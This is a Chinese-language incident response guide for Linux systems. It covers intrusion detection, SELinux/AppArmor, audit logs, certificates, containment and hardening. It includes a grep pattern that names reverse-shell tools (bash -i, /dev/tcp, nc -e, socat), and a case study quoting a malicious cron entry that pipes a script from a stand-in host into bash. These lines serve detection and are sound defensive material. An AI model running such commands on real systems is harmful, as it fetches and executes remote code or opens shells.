# 安全事件响应指南

本文档提供Linux系统安全事件响应的完整流程和工具参考，适用于openEuler及主流Linux发行版。

---

## 1. 概述

### 安全事件分类

| 类别 | 描述 | 严重程度 |
|------|------|----------|
| 未授权访问 | 账户被盗、暴力破解、非法登录 | 高 |
| 恶意代码 | 木马、蠕虫、Rootkit、挖矿程序 | 高 |
| 数据泄露 | 敏感文件外泄、数据库被拖取 | 严重 |
| 拒绝服务 | DDoS、资源耗尽攻击 | 中-高 |
| 权限提升 | 本地提权、内核漏洞利用 | 严重 |
| 配置篡改 | 定时任务注入、自启服务植入 | 高 |

### 响应方法论（NIST事件响应生命周期）

1. **准备**：建立响应团队、工具和流程
2. **检测与分析**：发现安全事件并确定范围
3. **遏制、消除与恢复**：隔离威胁、清除恶意内容、恢复系统
4. **事后活动**：总结经验、改进防御

### 第一响应者原则

- **保全证据**：先取证再修复，不要直接清除可疑文件
- **保持冷静**：按流程操作，避免恐慌导致误操作
- **记录一切**：记录所有发现和操作步骤，包括时间戳
- **最小操作**：尽量用只读方式检查，减少对系统的修改
- **隔离优先**：断网但不关机，保留内存中的取证数据

---

## 2. 入侵检测与分析

### 2.1 异常进程检测

**可疑进程发现**：
```bash
ps auxf --sort=-%cpu | head -30           # 异常用户、路径、高资源占用
ls -la /proc/<PID>/exe                    # 实际可执行文件路径
cat /proc/<PID>/cmdline                   # 启动命令行
ls -la /proc/<PID>/fd/                    # 打开的文件描述符
```

**隐藏进程检测**：
```bash
# 对比 ps 与 /proc 目录，差异即为隐藏进程
diff <(ps -e -o pid= | sort -n) <(ls -1 /proc | grep '^[0-9]' | sort -n)
ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'   # 已删除但仍运行的二进制
```

**异常网络连接**：
```bash
ss -tunap | grep ESTAB                                          # 所有已建立连接
ss -tunap | awk '$5 !~ /:22$|:80$|:443$/ && $2 == "ESTAB"'     # 非标准端口外连
lsof -i -P -n | grep ESTABLISHED                                # 关联进程和网络
```

**定时任务检查**：
```bash
for user in $(cut -d: -f1 /etc/passwd); do echo "=== $user ==="; crontab -l -u "$user" 2>/dev/null; done
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/crontab
systemctl list-timers --all --no-pager    # systemd 定时器
```

**开机自启检查**：
```bash
systemctl list-unit-files --type=service --state=enabled --no-pager
cat /etc/rc.local /etc/rc.d/rc.local 2>/dev/null
ls -la /etc/init.d/
```

### 2.2 文件系统完整性

**关键文件修改检查**：
```bash
rpm -Va | grep -v '^\.\.\.\.\.\.\.\.  ' | sort     # RPM 系（openEuler/CentOS）
debsums -c 2>/dev/null                               # Debian 系
stat /bin/ls /bin/ps /usr/sbin/sshd                  # 关键二进制修改时间
```

**SUID/SGID 文件扫描与可疑文件查找**：
```bash
find / -perm -4000 -type f -ls 2>/dev/null                        # SUID 文件
find / -perm -2000 -type f -ls 2>/dev/null                        # SGID 文件
find / -mtime -1 -type f -ls 2>/dev/null | grep -v '/proc\|/sys'  # 近24小时修改
find / -name ".*" -not -path '/proc/*' -not -path '/sys/*' -ls 2>/dev/null  # 隐藏文件
find / -perm -0002 -type f -not -path '/proc/*' -ls 2>/dev/null   # 全局可写文件
```

**Rootkit 检测**：
```bash
rkhunter --check --skip-keypress --report-warnings-only
chkrootkit -q
ls -la /dev/shm/                                                   # 共享内存可疑文件
lsattr /usr/bin/ /usr/sbin/ 2>/dev/null | grep -v '^\-'           # 文件属性异常
```

### 2.3 用户账户异常

```bash
awk -F: '$3 == 0 && $1 != "root"' /etc/passwd          # UID=0 的非 root 用户
grep -v '/nologin\|/false' /etc/passwd                   # 可登录账户
awk -F: '$2 == ""' /etc/shadow                           # 空密码账户
stat /etc/passwd /etc/shadow /etc/group /etc/sudoers     # 文件修改时间
```

**SSH 密钥注入检查**：
```bash
for dir in /home/*/ /root/; do
    [ -f "${dir}.ssh/authorized_keys" ] && echo "=== $dir ===" && cat "${dir}.ssh/authorized_keys"
done
grep -r 'NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null   # sudo 提权
```

**登录历史分析**：
```bash
last -20                                                  # 最近登录记录
lastb -20 2>/dev/null                                     # 失败的登录尝试
lastlog | grep -v 'Never'                                 # 用户最后登录时间
journalctl -u sshd --no-pager | grep -i 'accepted\|failed\|invalid'
```

### 2.4 网络异常

```bash
# 异常出站连接
ss -tunap state established | awk '{print $5}' | sort | uniq -c | sort -rn

# 反弹 Shell 检测
lsof -c bash -c sh -i -P -n 2>/dev/null | grep -i 'tcp\|udp'
grep -rn 'bash -i\|/dev/tcp\|nc -e\|ncat\|socat' /var/log/ /home/ 2>/dev/null

# DNS 隧道 / 数据外泄
cat /etc/resolv.conf && stat /etc/resolv.conf             # DNS 配置篡改
find / \( -name "*.tar*" -o -name "*.zip" \) -mtime -7 2>/dev/null | grep -v '/proc\|/sys'
```

---

## 3. SELinux/AppArmor 问题

### 3.1 SELinux 拒绝分析

```bash
ausearch -m avc -ts today --no-pager                      # 查看拒绝日志
grep 'avc:  denied' /var/log/audit/audit.log | tail -20
sealert -a /var/log/audit/audit.log | head -80            # sealert 分析
ls -lZ /path/to/file                                      # 文件安全上下文
ps auxZ | grep <process>                                  # 进程安全上下文
semanage port -l | grep <port>                            # 端口标签
```

**常见修复方法**：

| 问题 | 命令 | 说明 |
|------|------|------|
| 文件上下文错误 | `restorecon -Rv /path` | 恢复默认上下文 |
| 自定义上下文 | `semanage fcontext -a -t httpd_sys_content_t '/web(/.*)?' && restorecon -Rv /web` | 定义新路径 |
| 布尔值调整 | `setsebool -P httpd_can_network_connect on` | 永久设置 |
| 策略模块 | `ausearch -m avc -ts today \| audit2allow -M mypolicy && semodule -i mypolicy.pp` | 自动生成策略 |

### 3.2 AppArmor 问题

```bash
journalctl -k --no-pager | grep 'apparmor="DENIED"'      # 拒绝事件
aa-status                                                  # 配置文件状态
aa-complain /etc/apparmor.d/usr.sbin.mysqld               # 切换 complain 模式
aa-enforce /etc/apparmor.d/usr.sbin.mysqld                # 切换 enforce 模式
```

### 3.3 常见安全框架问题

| 现象 | 可能原因 | 排查方法 |
|------|----------|----------|
| 服务启动失败 | SELinux 上下文错误 | `ausearch -m avc -ts recent` |
| 容器操作被阻止 | AppArmor 策略过严 | `journalctl -k \| grep DENIED` |
| 权限提升检测 | SUID 文件异常 | `find / -perm -4000 -newer /etc/passwd` |
| 文件无法访问 | SELinux 布尔值未开启 | `getsebool -a \| grep <service>` |

---

## 4. 审计日志分析

### 4.1 auditd 配置与使用

```bash
auditctl -l                                                # 查看当前规则
auditctl -w /etc/passwd -p wa -k passwd_changes           # 文件监控
auditctl -w /etc/shadow -p wa -k shadow_changes
auditctl -a always,exit -F arch=b64 -S execve -k exec_cmd # 系统调用监控
```

**关键审计规则**：

| 规则 | 监控目标 |
|------|----------|
| `-w /etc/passwd -p wa` | 用户账户变更 |
| `-w /etc/shadow -p wa` | 密码文件变更 |
| `-w /etc/ssh/sshd_config -p wa` | SSH 配置变更 |
| `-a always,exit -S execve` | 所有命令执行 |
| `-w /var/log/ -p wa` | 日志文件篡改 |
| `-w /etc/crontab -p wa` | 定时任务变更 |

### 4.2 重要事件追踪

```bash
ausearch -k passwd_changes --no-pager                     # 按关键字搜索
ausearch -ua 1000 --no-pager                              # 按用户搜索
ausearch -f /etc/shadow --no-pager                        # 按文件搜索
ausearch -sc chmod --no-pager                             # 按系统调用搜索
aureport --summary --no-pager                             # 综合报告
aureport --auth --no-pager                                # 认证事件
aureport --login --no-pager                               # 登录事件
aureport --exec --no-pager                                # 命令执行事件
```

---

## 5. 密钥与证书问题

### 5.1 SSL/TLS 证书

```bash
openssl x509 -in /etc/pki/tls/certs/server.crt -noout -dates              # 检查有效期
echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -dates  # 远程证书
openssl verify -CAfile /etc/pki/tls/certs/ca-bundle.crt /path/to/server.crt        # 证书链验证
```

| 错误信息 | 原因 | 解决方法 |
|----------|------|----------|
| `certificate has expired` | 证书过期 | 更新证书 |
| `unable to get local issuer certificate` | 缺少 CA 证书 | 安装中间 CA |
| `certificate verify failed` | 证书链不完整 | 补全证书链 |
| `hostname mismatch` | 域名不匹配 | 检查 SAN/CN |

### 5.2 SSH 密钥管理

```bash
ssh -vvv user@host 2>&1 | grep -i 'auth\|key\|offer'     # 详细调试
ssh-keygen -R <hostname>                                   # 清除旧主机密钥
```

**密钥权限要求**：

| 文件 | 权限 | 命令 |
|------|------|------|
| `~/.ssh/` | 700 | `chmod 700 ~/.ssh` |
| `~/.ssh/id_rsa` | 600 | `chmod 600 ~/.ssh/id_rsa` |
| `~/.ssh/authorized_keys` | 600 | `chmod 600 ~/.ssh/authorized_keys` |
| `~/.ssh/config` | 600 | `chmod 600 ~/.ssh/config` |

### 5.3 LUKS/磁盘加密

```bash
cryptsetup luksDump /dev/sda2                              # 查看加密状态
cryptsetup luksDump /dev/sda2 | grep 'Key Slot'           # 密钥槽状态
cryptsetup luksOpen --test-passphrase --key-file /path/to/keyfile /dev/sda2  # 验证密钥
cryptsetup luksAddKey /dev/sda2                            # 添加备用密钥
```

---

## 6. 应急响应流程

### 6.1 初步响应

**快速系统状态快照**：
```bash
uname -a && uptime && who && w && last -10
ps auxf
ss -tunap
mount && df -h
```

**隔离受影响系统**：
```bash
iptables -I INPUT -j DROP && iptables -I OUTPUT -j DROP
iptables -I INPUT -s <admin_ip> -j ACCEPT
iptables -I OUTPUT -d <admin_ip> -j ACCEPT
```

**保全证据**：
```bash
LOGFILE="incident_$(date +%Y%m%d_%H%M%S).log"
{ date; ps auxf; ss -tunap; netstat -rn; cat /etc/passwd; last; } > "$LOGFILE"
journalctl --no-pager -n 1000 >> "$LOGFILE"
```

### 6.2 深度分析

**时间线构建**：
```bash
ausearch -ts '07/01/2025' -te '07/02/2025' --no-pager | head -200
find / -newermt '2025-07-01' ! -newermt '2025-07-02' -type f -ls 2>/dev/null \
    | grep -v '/proc\|/sys\|/run'
journalctl --since "2025-07-01" --until "2025-07-02" --no-pager
```

**攻击路径还原**：
1. 确定入侵时间点（从日志中找最早异常）
2. 分析入侵方式（漏洞利用、弱密码、社工等）
3. 追踪横向移动（是否扩散到其他系统）
4. 确定攻击者活动范围（访问/修改了哪些数据）

### 6.3 恢复与加固

```bash
# 更新系统
yum update -y                         # openEuler/CentOS
apt update && apt upgrade -y          # Debian/Ubuntu

# 加强 SSH
sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# 启用防火墙
systemctl enable --now firewalld
firewall-cmd --set-default-zone=drop
firewall-cmd --permanent --add-service=ssh && firewall-cmd --reload
```

---

## 7. 诊断工具速查

| 工具 | 用途 | 常用命令 | 安装方式 |
|------|------|----------|----------|
| `ausearch` | 审计日志搜索 | `ausearch -m avc -ts today` | audit |
| `aureport` | 审计报告生成 | `aureport --auth --summary` | audit |
| `sealert` | SELinux 告警分析 | `sealert -a /var/log/audit/audit.log` | setroubleshoot-server |
| `rkhunter` | Rootkit 检测 | `rkhunter --check` | rkhunter |
| `chkrootkit` | Rootkit 检测 | `chkrootkit -q` | chkrootkit |
| `openssl` | 证书/加密操作 | `openssl x509 -in cert.crt -noout -dates` | openssl |
| `ss` | 套接字统计 | `ss -tunap` | iproute |
| `lsof` | 文件/网络关联 | `lsof -i -P -n` | lsof |
| `find` | 安全文件扫描 | `find / -perm -4000 -type f` | coreutils |
| `audit2allow` | SELinux 策略生成 | `audit2allow -M mod` | policycoreutils-python |
| `aa-status` | AppArmor 状态 | `aa-status` | apparmor-utils |

---

## 8. 常见案例

### 案例1：SELinux 拒绝导致 httpd 无法访问文件

**现象**：httpd 返回 403 Forbidden，文件权限正常。

**排查与修复**：
```bash
ausearch -m avc -c httpd --no-pager
# type=AVC msg=audit(...): avc:  denied  { read } for comm="httpd"
#   scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:default_t:s0

ls -lZ /var/www/html/index.html   # 发现上下文为 default_t（错误）
restorecon -Rv /var/www/html/     # 恢复为 httpd_sys_content_t（正确）
```

### 案例2：SSH 暴力破解后的入侵分析

**现象**：系统响应缓慢，发现异常进程和外连。

**排查**：
```bash
journalctl -u sshd --no-pager | grep 'Failed password' | awk '{print $11}' | sort | uniq -c | sort -rn | head
journalctl -u sshd --no-pager | grep 'Accepted' | tail -20
ps auxf | awk '$3 > 50'                                    # 高 CPU 进程
ss -tunap | grep ESTAB | grep -v ':22\|:80\|:443'         # 异常外连
grep -r 'NOPASSWD' /etc/sudoers /etc/sudoers.d/           # 后门检查
```

### 案例3：定时任务被注入恶意脚本

**现象**：系统周期性出现异常 CPU 使用和外连。

**排查与修复**：
```bash
crontab -l && cat /etc/cron.d/*
# 发现: */5 * * * * curl -s http://malicious.site/payload.sh | bash

stat /etc/cron.d/malicious_job                             # 注入时间
ausearch -f /etc/cron.d/ --no-pager                        # 追踪操作者
rm -f /etc/cron.d/malicious_job                            # 清除恶意任务
kill <PID>                                                  # 终止恶意进程
find / -name ".*" -newer /etc/cron.d -type f -ls 2>/dev/null  # 清理后门
```

---

## 9. 预防措施

### 系统加固清单

| 措施 | 操作 | 优先级 |
|------|------|--------|
| 最小化安装 | 仅安装必要的软件包和服务 | 高 |
| 及时更新 | 建立补丁管理流程，定期更新 | 高 |
| 强密码策略 | 配置 PAM 模块强制复杂密码 | 高 |
| 禁止 root 远程登录 | SSH 配置 `PermitRootLogin no` | 高 |
| 密钥认证 | SSH 使用密钥登录，禁用密码认证 | 高 |
| 防火墙 | 仅开放必要端口 | 高 |
| SELinux/AppArmor | 保持 enforcing 模式 | 中 |
| 审计日志 | 启用 auditd 监控关键操作 | 中 |
| 文件完整性 | 部署 AIDE 定期校验 | 中 |
| 日志集中 | 将日志发送到远程日志服务器 | 中 |
| 入侵检测 | 部署 HIDS（如 OSSEC） | 中 |
| 定期扫描 | 使用 rkhunter/chkrootkit 定期检查 | 低 |
